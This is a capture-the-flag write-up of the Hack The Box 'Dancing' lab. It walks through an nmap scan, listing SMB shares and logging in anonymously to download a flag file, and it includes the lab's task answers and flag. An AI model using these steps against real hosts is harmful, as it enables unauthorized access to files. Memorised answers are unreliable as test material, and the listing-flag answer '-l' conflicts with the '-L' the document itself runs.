# HTB Starting Point – Dancing

Difficulty: Very Easy  
Date: 14/11/2025  

---

## VPN Connection

The same `.ovpn` file previously downloaded in the `sf_shared` directory of the Kali Linux VM was used.  
The HTB VPN connection was started with:

sudo openvpn --config /media/sf_Shared/starting_point_ctrlxrico.ovpn --daemon

Assigned IP: 10.10.15.9  
Target: 10.129.3.9

---

## Connectivity Check

ping -c 5 10.129.3.9  
PING 10.129.3.9 (10.129.3.9) 56(84) bytes of data.  
64 bytes from 10.129.3.9: icmp_seq=1 ttl=127 time=58.4 ms  
64 bytes from 10.129.3.9: icmp_seq=2 ttl=127 time=58.5 ms  
64 bytes from 10.129.3.9: icmp_seq=3 ttl=127 time=58.4 ms  
64 bytes from 10.129.3.9: icmp_seq=4 ttl=127 time=59.1 ms  
64 bytes from 10.129.3.9: icmp_seq=5 ttl=127 time=57.9 ms

--- 10.129.3.9 ping statistics ---  
5 packets transmitted, 5 received, 0% packet loss  
rtt min/avg/max/mdev = 57.858/58.447/59.080/0.388 ms

The target is reachable.

---

## Port Scanning

A version detection scan was executed:

nmap -sV 10.129.3.9  
Starting Nmap 7.95  
Host is up (0.068s latency).  
Not shown: 996 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds?  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Service Info: OS: Windows

Open ports identified:  
135/tcp • msrpc  
139/tcp • netbios-ssn  
445/tcp • microsoft-ds  
5985/tcp • http

---

## Verification Tasks

### Task 1 – Meaning of the acronym SMB

Answer: Server Message Block  
Status: Correct

---

### Task 2 – Port used by SMB

Answer: 445/tcp  
Status: Correct

---

### Task 3 – Service name discovered on port 445

Answer: microsoft-ds  
Status: Correct

---

### Task 4 – smbclient flag used to list available shares

Answer: -l  
Status: Correct

---

### Task 5 – Number of available shares

Answer: 4

Evidence:

smbclient -L 10.129.3.9  
Shares:  
ADMIN$  
C$  
IPC$  
WorkShares

---

### Task 6 – Share accessible without a password

Answer: WorkShares  
Status: Correct

---

### Task 7 – Command used in SMB shell to download files

Answer: get  
Status: Correct

---

### Task 8 – Root Flag

Access to the share was obtained using:

smbclient //10.129.3.9/WorkShares -N

Inside the shared directory, the following path was identified:

WorkShares → James.P → flag.txt

Evidence:

smb: > ls  
smb: > cd James.P\  
smb: \James.P> ls  
flag.txt found

File download:

smb: \James.P> get flag.txt

Flag retrieval:

cat flag.txt  
5f61c10dffbc77a704d76016a22f1664

Flag: 5f61c10dffbc77a704d76016a22f1664  
Status: Correct

---

## Notes

This machine demonstrates the security risks of misconfigured SMB shares, especially when anonymous access is allowed.  
The exposure of port 445 combined with unrestricted access enables directory traversal and retrieval of sensitive files.

---

## Author

Report by delerico
